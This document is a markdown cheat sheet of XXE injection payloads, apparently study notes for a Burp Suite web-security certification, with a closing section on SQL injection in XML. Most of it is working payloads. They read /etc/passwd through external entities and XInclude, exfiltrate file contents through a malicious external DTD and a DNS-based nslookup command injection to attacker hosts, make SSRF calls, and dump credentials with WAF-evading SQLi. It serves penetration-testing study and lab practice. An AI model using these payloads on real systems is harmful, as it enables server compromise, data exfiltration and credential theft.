It is possible to cause the application’s XML parser to include external resources. This can include files or in some circumstances initiate requests to third party servers.

| XXE Attack Type                                                     | Description                                                                                                        |
| ------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| Exploiting XXE to LFI                                               | Where an external entity is defined containing the contents of a file, and returned in the application's response. |
| Exploiting XXE to Perform SSRF Attacks                              | Where an external entity is defined based on a URL to a back-end system.                                           |
| Exploiting Blind XXE exfiltrate data using a malicious external DTD | Where sensitive data is transmitted from the application server to a system that the attacker controls.            |
| Exploiting blind XXE to Retrieve Data Via Error Messages            | Where the attacker can trigger a parsing error message containing sensitive data.                                  |
| XInclude                                                            | Where the attacker cant carry out classical Doctype we can use XML specification like Xinclude                     |


**Basically There is 2 types of XXE Blind and Referenced**

Blind
```sh
#we dont reference it into the attribute
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://OASTIFY.com"> %xxe; ]>
```


Referenced
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http:/OASTIFY.com">]>
<firstName>&xxe;</firstName>
```

###### XXE Entity Example
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe "XXE"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
###### XXE inside SOAP Example


```
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

###### XXE inside SVG

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text></svg>
```

###### XXE Base64 Encoded
```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

###### XXE UTF-7 Exmaple


```
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

###### XXE File Include

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&xxe;</lastName>
</userInfo>

#Using wrappers

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```


**XXE SSRF**

```
#Blind SSRF
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http:/OASTIFY.com"> %xxe; ]>

#Parsed SSRF
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http:/OASTIFY.com">]>
<firstName>&xxe;</firstName>
```

###### XInclude  file read
To execute an `XInclude` attack, the `XInclude` namespace must be declared, and the file path for the intended external entity must be specified. Below is a succinct example of how such an attack can be formulated:

```XML
#URL encode the XXE payload before sending.

<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```


###### Xinclude SSRF

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://collab/"></xi:include></root>
<XML BEGINNING>

```


###### XXE  exfiltrate data using a malicious external DTD

change the hosted file name to `/exploit.dtd` as the exploit file with Document Type Definition (DTD) extension, containing the following payload. The `&#x25;` is the Unicode hex character code for percent sign `%`.

we can trigger errors in the xml by inserting a an invalid file for example to maybe leak some sensitive error based  `<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">`

> store in the Exploit Server

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http:/OASTIFY.com/?x=%file;'>">
%eval;
%exfiltrate;
```

> Check /product/stock page and paste the payload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit.dtd"> %xxe;]>
```


###### XXE: Command injection

[![image](https://user-images.githubusercontent.com/58632878/225074086-5357aeac-a445-47d8-87e8-a472bf874f6d.png)](https://user-images.githubusercontent.com/58632878/225074086-5357aeac-a445-47d8-87e8-a472bf874f6d.png)

```
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>Example1</username>
        <email>example1@domain.com&`nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com`</email>
    </user>
</users>
```


###### SQL + XML + HackVertor


vulnerabilities are _**identified**_ in a XML Post body and inserting mathematical expression such as `7x7` into field and observing the evaluated value.

[![identify-math-evaluated-xml](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-math-evaluated-xml.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-math-evaluated-xml.png)
WAF detect attack when appending SQL

pass the WAF, Use Burp extension **Hackvertor** to [obfuscate](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#obfuscation) the SQL Injection payload in the XML post body.

```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```


SQLi payloads to read local file, or output to another folder on target.

```
<@hex_entities>1 UNION all select load_file('/home/carlos/secret')<@/hex_entities>  

<@hex_entities>1 UNION all select load_file('/home/carlos/secret') into outfile '/tmp/secret'<@/hex_entities>
```
#### Resources 

-  https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity  
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#xxe-injections
- https://github.com/DingyShark/BurpSuiteCertifiedPractitioner?tab=readme-ov-file#xss